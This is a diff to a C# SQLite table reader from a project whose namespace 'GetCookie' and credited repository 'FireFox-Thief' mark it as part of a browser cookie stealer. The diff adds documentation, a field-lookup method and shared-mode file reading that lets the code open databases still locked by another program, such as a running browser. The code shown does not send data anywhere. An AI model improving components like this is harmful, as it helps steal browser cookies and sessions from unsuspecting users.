@@ -1,4 +1,4 @@
-﻿/* 
+/* 
     Author : LimerBoy
     Github : github.com/LimerBoy/FireFox-Thief
 */
@@ -9,6 +9,9 @@ using System.Text;
 
 namespace GetCookie.Helper
 {
+    /// <summary>
+    /// Very light weight SQLite table reader.
+    /// </summary>
     internal class SQLite
     {
         private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
@@ -19,14 +22,30 @@ namespace GetCookie.Helper
         private SqliteMasterEntry[] _masterTableEntries;
         private TableEntry[] _tableEntries;
 
+        /// <summary>
+        /// Read entire sqlite database into memory. (not locked).
+        /// </summary>
+        /// <param name="fileName"></param>
         public SQLite(string fileName)
         {
-            _fileBytes = File.ReadAllBytes(fileName);
+            //_fileBytes = File.ReadAllBytes(fileName); //easier but may be blocked if already open by another.
+            using (var fs = new FileStream(fileName, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite, 4096, FileOptions.SequentialScan))
+            {
+                _fileBytes = new byte[fs.Length];
+                fs.Read(_fileBytes, 0, _fileBytes.Length);
+            }
+
             _pageSize = ConvertToULong(16, 2);
             _dbEncoding = ConvertToULong(56, 4);
             ReadMasterTable(100L);
         }
 
+        /// <summary>
+        /// Get table/cell value
+        /// </summary>
+        /// <param name="rowNum">row index</param>
+        /// <param name="field">column index</param>
+        /// <returns>Cell value or null if indices are out of range.</returns>
         public string GetValue(int rowNum, int field)
         {
             try
@@ -41,6 +60,26 @@ namespace GetCookie.Helper
             }
         }
 
+        /// <summary>
+        /// Get the column index by column/field name
+        /// </summary>
+        /// <param name="name">Field name (case-insensitive)</param>
+        /// <returns>field/column index or -1 if not found.</returns>
+        public int GetFieldIndex(string name)
+        {
+            for(int i=0; i< _fieldNames.Length; i++)
+            {
+                if (_fieldNames[i].Equals(name, StringComparison.CurrentCultureIgnoreCase))
+                    return i;
+            }
+
+            return -1;
+        }
+
+        /// <summary>
+        /// Get the number of rows in the active table.
+        /// </summary>
+        /// <returns>row count</returns>
         public int GetRowCount()
         {
             return _tableEntries.Length;
@@ -207,6 +246,11 @@ namespace GetCookie.Helper
             }
         }
 
+        /// <summary>
+        /// Make this table active for reading.
+        /// </summary>
+        /// <param name="tableName">Name of table (case-insensitive)</param>
+        /// <returns>True if activated. False if not found.</returns>
         public bool ReadTable(string tableName)
         {
             try
@@ -352,6 +396,12 @@ namespace GetCookie.Helper
             public string SqlStatement;
         }
 
+        /// <summary>
+        /// Read database and activate table.
+        /// </summary>
+        /// <param name="database">name of sqlite file.</param>
+        /// <param name="table">Name of table (case-insensitive)</param>
+        /// <returns>new SQLite object or null upon error</returns>
         public static SQLite ReadTable(string database, string table)
         {
             if (!File.Exists(database))
